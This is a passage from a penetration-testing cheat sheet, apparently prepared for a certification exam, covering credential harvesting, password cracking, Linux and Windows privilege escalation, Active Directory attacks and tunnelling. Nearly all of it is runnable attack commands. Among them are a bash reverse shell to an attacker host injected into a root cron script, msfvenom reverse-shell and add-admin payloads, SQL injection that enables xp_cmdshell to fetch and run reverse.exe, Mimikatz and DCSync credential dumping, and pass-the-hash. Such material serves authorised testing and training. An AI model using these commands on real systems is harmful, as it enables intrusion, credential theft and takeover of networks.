find / -type f \( -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" -o -name "authorized_keys" -o -name "known_hosts" \) 2>/dev/null
```

### History Files

```bash
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.mysql_history
cat ~/.psql_history

find /home -type f \( -name ".*history" -o -name ".bashrc" -o -name ".profile" \) -exec grep -HniE "pass|password|ssh|mysql|token|secret" {} \; 2>/dev/null
```

### Environment Variables

```bash
env
printenv
cat /proc/self/environ | tr '\0' '\n'
grep -RniE "PASSWORD|PASS|TOKEN|SECRET|KEY|USER" /proc/*/environ 2>/dev/null
```

### Running Processes

```bash
ps auxww
ps auxww | grep -iE "pass|password|token|secret|key|mysql|ssh"
watch -n 1 'ps auxww | grep -iE "pass|password|token|secret|key|mysql|ssh"'
```

### Cron and Scripts

```bash
cat /etc/crontab
ls -lah /etc/cron*
grep -RniE "pass|password|token|secret|key|mysql|backup|ssh" /etc/cron* /opt /usr/local/bin /var/backups 2>/dev/null
```

### Backups and Archives

```bash
find / -type f \( -name "*.zip" -o -name "*.7z" -o -name "*.tar" -o -name "*.tar.gz" -o -name "*.tgz" -o -name "*.bak" -o -name "*.backup" -o -name "*.old" \) 2>/dev/null
```

Crack zip:

```bash
zip2john backup.zip > ziphash.txt
john ziphash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --show ziphash.txt
7z x backup.zip
```

### Local Network / Loopback Cleartext

```bash
ss -antup
sudo tcpdump -i lo -A | grep -iE "pass|password|user|login|token"
```

---

### 9.2 Windows Credential Harvesting

### Manual Triage

```cmd
whoami /all
hostname
ipconfig /all
net user
net localgroup
net localgroup administrators
dir C:\
tree /f /a
```

PowerShell:

```powershell
whoami /priv
whoami /groups
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
Get-ChildItem C:\
```

### Hidden Files

```cmd
dir /a:h C:\
dir /s /b /a:h C:\Users\ 2>nul
```

```powershell
Get-ChildItem -Path C:\Users -Force -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Attributes -match "Hidden"}
```

### Search TXT, XML, Config, INI, JSON

```cmd
dir /s /b C:\*.txt C:\*.xml C:\*.config C:\*.ini C:\*.json C:\*.yml C:\*.yaml 2>nul
```

```cmd
findstr /S /I /M "password passwd pwd username user secret token api key connectionString" C:\*.txt C:\*.xml C:\*.config C:\*.ini C:\*.json C:\*.yml C:\*.yaml 2>nul
```

PowerShell:

```powershell
Get-ChildItem -Path C:\ -Include *.txt,*.xml,*.config,*.ini,*.json,*.yml,*.yaml -File -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password|passwd|pwd|username|user|secret|token|api|key|connectionString" -CaseSensitive:$false
```

### Database Files: .db / .sqlite / .sqlite3

```cmd
dir /s /b C:\*.db C:\*.sqlite C:\*.sqlite3 2>nul
```

```powershell
Get-ChildItem -Path C:\ -Include *.db,*.sqlite,*.sqlite3 -File -Recurse -ErrorAction SilentlyContinue
```

Download DB and inspect on Kali:

```bash
sqlite3 loot.db ".tables"
sqlite3 loot.db "select * from users;"
strings loot.db | grep -iE "pass|password|user|username|hash|secret|token"
```

### Web and App Configs

```cmd
type C:\inetpub\wwwroot\web.config
type C:\xampp\passwords.txt
type C:\xampp\mysql\bin\my.ini
dir /s /b C:\inetpub\*.config C:\xampp\*.ini C:\xampp\*.txt 2>nul
```

PowerShell:

```powershell
Get-ChildItem C:\inetpub,C:\xampp -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password|username|connectionString|uid|pwd"
```

### PowerShell History

```powershell
Get-History
type (Get-PSReadlineOption).HistorySavePath
Get-Content (Get-PSReadlineOption).HistorySavePath
```

Common path:

```cmd
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### Registry Passwords

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

### Unattended Install Files

```cmd
dir /s /b C:\unattend.xml C:\sysprep.inf C:\sysprep.xml C:\autounattend.xml 2>nul
dir /s /b C:\Windows\Panther\Unattend.xml C:\Windows\Panther\Autounattend.xml 2>nul
```

```powershell
Get-ChildItem -Path C:\Windows\Panther,C:\Windows\System32\Sysprep,C:\ -Include *unattend*.xml,*sysprep*.xml -File -Recurse -ErrorAction SilentlyContinue
```

### Windows.old SAM/SYSTEM

```cmd
dir C:\Windows.old\Windows\System32\config\
```

Download these files:

```text
C:\Windows.old\Windows\System32\config\SAM
C:\Windows.old\Windows\System32\config\SYSTEM
C:\Windows.old\Windows\System32\config\SECURITY
```

Dump offline on Kali:

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

### Live SAM / LSA / LSASS with NetExec

```bash
nxc smb $IP -u '<USER>' -p '<PASS>' --sam
nxc smb $IP -u '<USER>' -p '<PASS>' --lsa
nxc smb $IP -u '<USER>' -p '<PASS>' -M lsassy
```

### Mimikatz

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
mimikatz.exe "privilege::debug" "sekurlsa::tickets" "exit"
```

### Thunderbird / Browser / User Files

```powershell
Get-ChildItem C:\Users -Recurse -Force -ErrorAction SilentlyContinue | Where-Object {$_.FullName -match "Thunderbird|Firefox|Chrome|Edge|AppData|Downloads|Documents|Desktop"}
```

### Interesting Directories

```cmd
dir C:\Users\<USER>\Desktop
dir C:\Users\<USER>\Documents
dir C:\Users\<USER>\Downloads
dir C:\Backups
dir C:\backup
dir C:\xampp
dir C:\inetpub
dir C:\ProgramData
```

---

## 10. Password Attacks & Cracking

### John

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --show hash.txt
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --format=NT --show hashes.txt
```

### Hashcat

```bash
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### Common Hash Modes

```text
1000  = NTLM
13100 = Kerberos 5 TGS-REP / Kerberoast
18200 = Kerberos 5 AS-REP / AS-REP Roast
```

### zip2john / ssh2john

```bash
zip2john backup.zip > ziphash.txt
john ziphash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --show ziphash.txt

ssh2john id_rsa > sshhash.txt
john sshhash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --show sshhash.txt
```

### Generate Pattern Wordlist

```bash
crunch 6 6 -t Lab%%% > list.txt
hydra -l <USER> -P list.txt ssh://$IP
```

---

## 11. Linux Privilege Escalation

---

### 11.1 Initial Triage

```bash
id
whoami
hostname
uname -a
cat /etc/issue
cat /etc/os-release
sudo -l
ip a
route
ss -antup
ps auxww
env
w
last
```

### Users and Groups

```bash
cat /etc/passwd
cat /etc/shadow 2>/dev/null
grep -E "sh$|bash$" /etc/passwd
```

### Filesystem

```bash
find / -writable -type d 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/sbin/getcap -r / 2>/dev/null
mount
cat /etc/fstab
lsblk
df -h
```

### Installed Packages

```bash
dpkg -l 2>/dev/null
rpm -qa 2>/dev/null
```

### Kernel Modules

```bash
lsmod
/sbin/modinfo <MODULE>
```

### Automated Tools

```bash
wget http://<LHOST>/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/linpeas.out

./unix-privesc-check standard > output.txt
```

### pspy

```bash
wget http://<LHOST>/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64
```

---

### 11.2 Sudo Abuse

```bash
sudo -l
```

Check GTFOBins:

```text
https://gtfobins.github.io/
```

Examples:

```bash
sudo -i
sudo su
sudo find . -exec /bin/sh -p \; -quit
sudo apt-get changelog apt
# then type:
!/bin/sh
```

OpenVPN sudo vector:

```bash
sudo openvpn --dev null --script-security 2 --up '/bin/sh -s'
```

---

### 11.3 SUID Binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

Example:

```bash
find . -exec /bin/sh -p \; -quit
```

SUID bash:

```bash
/bin/bash -p
```

---

### 11.4 Linux Capabilities

```bash
/usr/sbin/getcap -r / 2>/dev/null
```

Perl cap_setuid example:

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

Python cap_setuid example:

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
```

---

### 11.5 Cron Jobs

```bash
cat /etc/crontab
ls -lah /etc/cron*
grep "CRON" /var/log/syslog 2>/dev/null
crontab -l
sudo crontab -l
```

If writable root-executed script:

```bash
echo 'bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"' >> /path/to/script.sh
```

Alternative SUID bash payload:

```bash
echo 'chmod u+s /bin/bash' >> /path/to/script.sh
/bin/bash -p
```

---

### 11.6 Writable /etc/passwd

```bash
ls -l /etc/passwd
openssl passwd -6 -salt xyz password123
echo 'root2:<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd
su root2
```

---

### 11.7 Kernel Exploits

```bash
uname -a
cat /etc/issue
cat /etc/os-release
searchsploit "linux kernel Ubuntu <VERSION> privilege escalation"
searchsploit "DirtyCow"
searchsploit "DirtyPipe"
```

Compile on target if possible:

```bash
gcc exploit.c -o exploit
chmod +x exploit
./exploit
```

---

### 11.8 Backup / Archive Pattern

```bash
find / -type f \( -name "*.zip" -o -name "*.7z" -o -name "*.bak" -o -name "*.backup" -o -name "*.old" \) 2>/dev/null
scp <USER>@$IP:/opt/backup/* .
zip2john sitebackup.zip > ziphash.txt
john ziphash.txt --wordlist=/usr/share/wordlists/rockyou.txt
7z x sitebackup.zip
grep -RniE "pass|password|username|secret|key" .
```

---

## 12. Windows Privilege Escalation

---

### 12.1 Initial Triage

```cmd
whoami
whoami /all
whoami /priv
whoami /groups
hostname
systeminfo
ipconfig /all
route print
netstat -ano
tasklist
net user
net localgroup
net localgroup administrators
```

PowerShell:

```powershell
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
Get-Process
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```

### Installed Applications

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname,displayversion,installlocation
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname,displayversion,installlocation
```

---

### 12.2 Automated Enumeration

### WinPEAS

```powershell
iwr -uri http://<LHOST>/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe
```

### PowerUp

```powershell
powershell -ep bypass
iwr -uri http://<LHOST>/PowerUp.ps1 -Outfile PowerUp.ps1
Import-Module .\PowerUp.ps1
Invoke-AllChecks
Get-ModifiableServiceFile
Get-UnquotedService
Get-ScheduledTask
```

---

### 12.3 AlwaysInstallElevated

Check:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Exploit:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -a x64 --platform Windows -f msi -o evil.msi
```

```cmd
msiexec /quiet /qn /i evil.msi
```

---

### 12.4 Service Binary Hijacking

Enumerate services:

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,StartMode,PathName
```

Check permissions:

```cmd
icacls "C:\Path\To\Service.exe"
```

Permission masks:

```text
F  = Full access
M  = Modify
RX = Read and execute
R  = Read
W  = Write
```

Replace binary:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o service.exe
```

```powershell
iwr http://<LHOST>/service.exe -Outfile C:\Path\To\Service.exe
Restart-Service <SERVICE>
```

If restart not allowed:

```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<SERVICE>'}
shutdown /r /t 0
```

---

### 12.5 Unquoted Service Path

Find:

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | findstr /i "Program Files"
```

Check writable paths:

```cmd
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\<DIR>"
```

Exploit:

```bash
msfvenom -p windows/adduser USER=hacker PASS='Password123!' -f exe -o Current.exe
```

```cmd
copy Current.exe "C:\Program Files\Current.exe"
```

```powershell
Restart-Service <SERVICE>
```

---

### 12.6 DLL Hijacking

Find writable application directory:

```cmd
icacls "C:\Program Files\<APP>"
echo test > "C:\Program Files\<APP>\test.txt"
```

Use ProcMon if GUI available:

```text
Filter: Process Name is target.exe
Filter: Path ends with .dll
Look for: NAME NOT FOUND in writable application directory.
```

Generate DLL:

```bash
msfvenom -p windows/x64/exec CMD="cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add" -f dll -o <MISSING_DLL>.dll
```

Compile custom DLL:

```bash
x86_64-w64-mingw32-gcc exploit.cpp --shared -o <MISSING_DLL>.dll
```

Transfer:

```powershell
iwr -uri http://<LHOST>/<MISSING_DLL>.dll -OutFile "C:\Program Files\<APP>\<MISSING_DLL>.dll"
```

---

### 12.7 Scheduled Tasks

Enumerate:

```cmd
schtasks /query /fo LIST /v
```

Look for:

```text
TaskName
Task To Run
Run As User
Next Run Time
```

Check permissions:

```cmd
icacls C:\Path\To\TaskBinary.exe
```

Replace writable binary:

```bash
msfvenom -p windows/adduser USER=hacker PASS='Password123!' -f exe -o task.exe
```

```powershell
iwr -Uri http://<LHOST>/task.exe -Outfile TaskBinary.exe
move C:\Path\To\TaskBinary.exe C:\Path\To\TaskBinary.exe.bak
move .\TaskBinary.exe C:\Path\To\TaskBinary.exe
```

---

### 12.8 Token Privileges

Always check:

```cmd
whoami /priv
```

Normal low-value privileges often include:

```text
SeShutdownPrivilege
SeChangeNotifyPrivilege
SeUndockPrivilege
SeIncreaseWorkingSetPrivilege
SeTimeZonePrivilege
```

High-value privileges:

```text
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeDebugPrivilege
SeManageVolumePrivilege
```

### SeImpersonatePrivilege - GodPotato Pattern

```powershell
iwr http://<LHOST>/GodPotato-NET4.exe -Outfile gp.exe
.\gp.exe -cmd "whoami"
```

Lab-only local admin creation:

```powershell
.\gp.exe -cmd "net user /add hacker Password123!"
.\gp.exe -cmd "net localgroup administrators hacker /add"
.\gp.exe -cmd "reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
```

Then:

```bash
evil-winrm -i $IP -u hacker -p 'Password123!'
```

### LocalAccountTokenFilterPolicy Fix

Use when you created a local admin but WinRM/SMB gives access denied:

```cmd
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

---

### 12.9 Kernel Exploits

```cmd
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

Search:

```bash
searchsploit "Windows Server 2008 privilege escalation"
searchsploit "MS11-046"
searchsploit "MS10-059"
searchsploit "MS15-051"
```

Compile:

```bash
i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32 -std=gnu89
```

---

## 13. Active Directory Methodology

---

### 13.1 Initial AD Setup

Put all AD IPs in `ips.txt`.

```bash
cat ips.txt
```

Generate hosts entries:

```bash
nxc smb ips.txt -u '<USER>' -p '<PASS>' --generate-hosts-file hosts.out
cat hosts.out | sudo tee -a /etc/hosts
```

Check access:

```bash
nxc smb ips.txt -u '<USER>' -p '<PASS>'
nxc winrm ips.txt -u '<USER>' -p '<PASS>'
nxc rdp ips.txt -u '<USER>' -p '<PASS>'
nxc mssql ips.txt -u '<USER>' -p '<PASS>'
```

Hash instead of password:

```bash
nxc smb ips.txt -u '<USER>' -H '<NTLM_HASH>'
evil-winrm -i <IP> -u '<USER>' -H '<NTLM_HASH>'
```

Local account:

```bash
nxc smb ips.txt -u '<USER>' -p '<PASS>' --local-auth
```

---

### 13.2 Native Windows Domain Enumeration

```cmd
net user /domain
net user <USER> /domain
net group /domain
net group "Domain Admins" /domain
net group "<GROUP>" /domain
net accounts /domain
setspn -L <USER>
nslookup <HOSTNAME>
```

Logged-on users:

```cmd
.\PsLoggedon.exe \\<COMPUTERNAME>
```

---

### 13.3 PowerView

```powershell
powershell -ep bypass
Import-Module .\PowerView.ps1
```

```powershell
Get-NetDomain
Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetUser -SPN | select samaccountname,serviceprincipalname
Get-NetGroup | select cn
Get-NetGroup "<GROUP>" | select member
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
Find-LocalAdminAccess
Get-NetSession -ComputerName <COMPUTER>
Find-DomainShare
```

ACLs:

```powershell
Get-ObjectAcl -Identity "<TARGET_GROUP_OR_USER>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
Convert-SidToName <SID>
```

Add user to group if you have rights:

```cmd
net group "<GROUP>" <USER> /add /domain
```

---

### 13.4 Custom LDAPSearch Function

Save as `function.ps1`:

```powershell
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )
    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName
    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
    return $DirectorySearcher.FindAll()
}
```

Load:

```powershell
Import-Module .\function.ps1
```

Queries:

```powershell
LDAPSearch -LDAPQuery "(samAccountType=805306368)"
LDAPSearch -LDAPQuery "(objectclass=group)"
LDAPSearch -LDAPQuery "name=<USER>"
```

Extract group memberships:

```powershell
$result = LDAPSearch -LDAPQuery "(name=<USER>)"
Foreach($obj in $result) {
    Foreach($prop in $obj.Properties) {
        $prop.memberof
    }
}
```

Nested group check:

```powershell
$group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=<GROUP>))"
$group.properties.member
```

---

### 13.5 BloodHound

### Collection from Kali

```bash
bloodhound-python -u '<USER>' -p '<PASS>' -ns <DC_IP> -d <DOMAIN> -c all --zip
```

### Collection from Windows

```powershell
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\<USER>\Desktop\ -OutputPrefix "corp-audit"
```

### Start BloodHound

```bash
sudo neo4j start
bloodhound
```

Useful queries:

```text
Find all Domain Admins
Find Shortest Paths to Domain Admins
Kerberoastable Users
AS-REP Roastable Users
Shortest Paths from Owned Principals
Find Computers with Unsupported Operating Systems
Find Principals with DCSync Rights
```

---

### 13.6 Domain Shares and GPP

```powershell
Find-DomainShare
```

Check SYSVOL:

```text
\\<DC>\SYSVOL\<DOMAIN>\Policies\
```

Search for GPP XML:

```bash
smbclient //<DC>/SYSVOL -U '<DOMAIN>/<USER>%<PASS>' -c 'recurse; prompt off; mget *'
grep -Rni "cpassword" .
gpp-decrypt '<CPASSWORD>'
```

---

## 14. AD Attacks & Lateral Movement

---

### 14.1 Password Spraying

Check policy first:

```cmd
net accounts /domain
```

SMB spray:

```bash
nxc smb ips.txt -u users.txt -p 'Password123!' -d <DOMAIN> --continue-on-success
```

Kerbrute spray:

```bash
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt 'Password123!'
```

---

### 14.2 AS-REP Roasting

```bash
impacket-GetNPUsers -dc-ip <DC_IP> -request -outputfile asrep.txt <DOMAIN>/<USER>
impacket-GetNPUsers -dc-ip <DC_IP> -usersfile users.txt -request -outputfile asrep.txt <DOMAIN>/
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

Windows:

```powershell
.\Rubeus.exe asreproast /nowrap
```

---

### 14.3 Kerberoasting

```bash
impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASS> -outputfile kerb.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

Windows:

```powershell
.\Rubeus.exe kerberoast /outfile:hash.txt
```

NetExec:

```bash
nxc ldap <DC_FQDN> -u '<USER>' -p '<PASS>' --kerberoasting kerb.txt
nxc ldap <DC_FQDN> -u '<USER>' -p '<PASS>' --asreproast asrep.txt
```

Clock skew fix:

```bash
sudo ntpdate -u <DC_IP>
```

---

### 14.4 MSSQL Lateral Movement

```bash
impacket-mssqlclient '<DOMAIN>/<USER>:<PASS>@<MSSQL_IP>' -windows-auth
```

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -c "iwr -uri http://<LHOST>/reverse.exe -OutFile C:\Users\Public\reverse.exe"';
EXEC xp_cmdshell 'C:\Users\Public\reverse.exe';
```

---

### 14.5 Credential Dumping After Admin

### NetExec

```bash
nxc smb <IP> -u '<USER>' -p '<PASS>' --sam
nxc smb <IP> -u '<USER>' -p '<PASS>' --lsa
nxc smb <IP> -u '<USER>' -p '<PASS>' -M lsassy
```

### Mimikatz

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
mimikatz.exe "privilege::debug" "sekurlsa::tickets" "exit"
```

### Offline SAM / SYSTEM

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

---

### 14.6 Pass-the-Hash

```bash
evil-winrm -i <IP> -u '<USER>' -H '<NTLM_HASH>'
nxc smb ips.txt -u '<USER>' -H '<NTLM_HASH>'
impacket-psexec '<DOMAIN>/<USER>@<IP>' -hashes :<NTLM_HASH>
impacket-wmiexec '<DOMAIN>/<USER>@<IP>' -hashes :<NTLM_HASH>
```

---

### 14.7 Silver Ticket

Requirements:

```text
SPN NTLM hash
Domain SID
Target SPN/FQDN
Service name
```

Get SID:

```cmd
whoami /user
```

Forge:

```cmd
kerberos::golden /sid:<DOMAIN_SID> /domain:<DOMAIN> /ptt /target:<TARGET_FQDN> /service:<SERVICE> /rc4:<SPN_NTLM_HASH> /user:<ANY_USER>
```

Verify:

```cmd
klist
```

---

### 14.8 DCSync

Mimikatz:

```cmd
lsadump::dcsync /user:<DOMAIN>\<TARGET_USER>
```

Impacket:

```bash
impacket-secretsdump -just-dc-user <TARGET_USER> '<DOMAIN>/<ADMIN_USER>:<PASS>@<DC_IP>'
impacket-secretsdump -just-dc '<DOMAIN>/<ADMIN_USER>:<PASS>@<DC_IP>'
```

Crack NTLM:

```bash
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt
```

---

### 14.9 GPO Abuse

If BloodHound shows GPO control:

```powershell
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <USER> --GPOName "<GPO_NAME>"
gpupdate /force
```

---

### 14.10 Windows.old Goldmine

```cmd
dir C:\Windows.old\Windows\System32\config\
```

Download:

```text
SAM
SYSTEM
SECURITY
```

Dump:

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

Try extracted local admin hash against DC or other hosts:

```bash
nxc smb ips.txt -u '<USER>' -H '<NTLM_HASH>' --local-auth
evil-winrm -i <IP> -u '<USER>' -H '<NTLM_HASH>'
```

---

## 15. Pivoting & Tunneling

---

### 15.1 Ligolo-ng

Kali:

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./ligolo_proxy -selfcert
```

Target:

```powershell
.\ligolo_agent.exe -ignore-cert -connect <LHOST>:11601
```

Ligolo console:

```text
session
autoroute
start
```

Manual route if needed:

```bash
sudo ip route add <INTERNAL_SUBNET>/24 dev ligolo
```

Reverse listener for internal reverse shells:

```text
listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443
```

Use payload `LHOST` as the compromised pivot machine’s reachable internal IP when using listener forwarding.

---

### 15.2 SSH Reverse Dynamic Port Forward

On Kali, generate key:

```bash
ssh-keygen -t rsa -N '' -f ~/.ssh/key
cat ~/.ssh/key.pub >> ~/.ssh/authorized_keys
```

From compromised Linux target back to Kali:

```bash
ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i key kali@<LHOST>
```

Proxychains:

```bash
sudo nano /etc/proxychains4.conf
```

Add:

```text
socks5 127.0.0.1 1080
```

Use:

```bash
proxychains nmap -sT -Pn -p445,3389,5985 <INTERNAL_IP>
proxychains xfreerdp /d:<DOMAIN> /u:<USER> /p:'<PASS>' /v:<INTERNAL_IP> +clipboard /cert:ignore
```

---

### 15.3 Chisel Quick Reference

Kali:

```bash
./chisel server -p 8000 --reverse
```

Target:

```bash
./chisel client <LHOST>:8000 R:socks
```

Proxychains:

```text
socks5 127.0.0.1 1080
```

### 15.4 Chisel Reverse Local Port Forwarding - Access Victim Local Services from Kali

Use this when a service is only listening on the victim’s localhost, such as MySQL on `127.0.0.1:3306`, and you want to access it from Kali.

> Chisel syntax note: `R:<KALI_LISTEN_PORT>:<VICTIM_HOST>:<VICTIM_PORT>` means Kali listens on `<KALI_LISTEN_PORT>` and forwards traffic through the victim to `<VICTIM_HOST>:<VICTIM_PORT>` from the victim’s perspective.

#### Example: Forward Victim MySQL `127.0.0.1:3306` to Kali `127.0.0.1:3306`

On Kali, start the Chisel reverse server:

```bash
chisel server --port 8000 --reverse
```

On Kali, host `chisel.exe` for download:

```bash
python3 -m http.server 80
```

On the Windows victim, download Chisel:

```powershell
iwr -uri http://192.168.45.195/chisel.exe -Outfile chisel.exe
```

On the Windows victim, create the reverse port forward:

```powershell
.\chisel.exe client 192.168.45.195:8000 R:3306:127.0.0.1:3306
```

From Kali, connect to the victim’s local MySQL service through your local port `3306`:

```bash
mysql -h 127.0.0.1 -P 3306 -u <USER> -p
```

If MySQL requires no SSL or throws SSL/TLS errors:

```bash
mysql -h 127.0.0.1 -P 3306 -u <USER> -p --skip-ssl
```

#### Safer Option: Use a Different Kali Listen Port

If Kali already has MySQL running on port `3306`, forward victim `3306` to Kali `13306` instead:

```powershell
.\chisel.exe client 192.168.45.195:8000 R:13306:127.0.0.1:3306
```

Then connect from Kali:

```bash
mysql -h 127.0.0.1 -P 13306 -u <USER> -p --skip-ssl
```

#### Linux Victim Version

On Kali:

```bash
chisel server --port 8000 --reverse
python3 -m http.server 80
```

On Linux victim:

```bash
wget http://192.168.45.195/chisel -O /tmp/chisel
chmod +x /tmp/chisel
/tmp/chisel client 192.168.45.195:8000 R:13306:127.0.0.1:3306
```

On Kali:

```bash
mysql -h 127.0.0.1 -P 13306 -u <USER> -p --skip-ssl
```

#### Quick Verification

On victim, confirm the service is local-only:

```bash
ss -antup | grep 3306
```

Windows victim:

```powershell
netstat -ano | findstr 3306
```

On Kali, confirm the forwarded port is listening:

```bash
ss -lntp | grep 3306
ss -lntp | grep 13306
```

#### Common Targets to Forward

```text
MySQL      3306
PostgreSQL 5432
MSSQL      1433
Redis      6379
MongoDB    27017
HTTP       80 / 8080
WinRM      5985 / 5986
RDP        3389
```

#### Common Patterns

Forward victim-local MySQL to Kali:

```bash
R:13306:127.0.0.1:3306
```

Forward victim-local web app to Kali:

```bash
R:8081:127.0.0.1:8080
```

Forward victim-local Redis to Kali:

```bash
R:6379:127.0.0.1:6379
```

Forward another internal host reachable by the victim:

```bash
R:8443:10.10.10.50:443
```

Then browse or connect from Kali:

```bash
curl http://127.0.0.1:8081
curl -k https://127.0.0.1:8443
redis-cli -h 127.0.0.1 -p 6379
```

---

## 16. Exam-Proven Attack Patterns

### Exposed `.git` to SSH

```text
HTTP exposes .git -> dump repo -> git show/log -> find DB or SSH creds -> SSH as user -> search backups -> crack archive -> sudo -l -> root.
```

Commands:

```bash
git-dumper http://<IP>/.git/ dumped
cd dumped
git show
grep -RniE "pass|password|username|secret" .
ssh <USER>@<IP>
```

---

### SNMP Leak to FTP to SSH Key

```text
UDP 161 SNMP public -> NET-SNMP-EXTEND leak reveals username/default password -> FTP login -> download SSH private key -> chmod 400 -> SSH -> local privesc.
```

Commands:

```bash
snmpwalk -v2c -c public <IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
ftp <IP>
chmod 400 id_rsa
ssh -i id_rsa <USER>@<IP>
```

---

### MSSQL SQLi to xp_cmdshell to SYSTEM

```text
Login SQLi -> time-based MSSQL confirmed -> enable xp_cmdshell -> download reverse.exe -> shell -> whoami /priv -> SeImpersonate -> GodPotato -> SYSTEM.
```

Commands:

```sql
'; WAITFOR DELAY '0:0:3'--
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
'; EXEC xp_cmdshell 'powershell -c "iwr -uri http://<LHOST>:8888/reverse.exe -OutFile C:\Windows\Temp\reverse.exe"';--
'; EXEC xp_cmdshell 'C:\Windows\Temp\reverse.exe';--
```

---

### Kerberoast to MSSQL Pivot to DC

```text
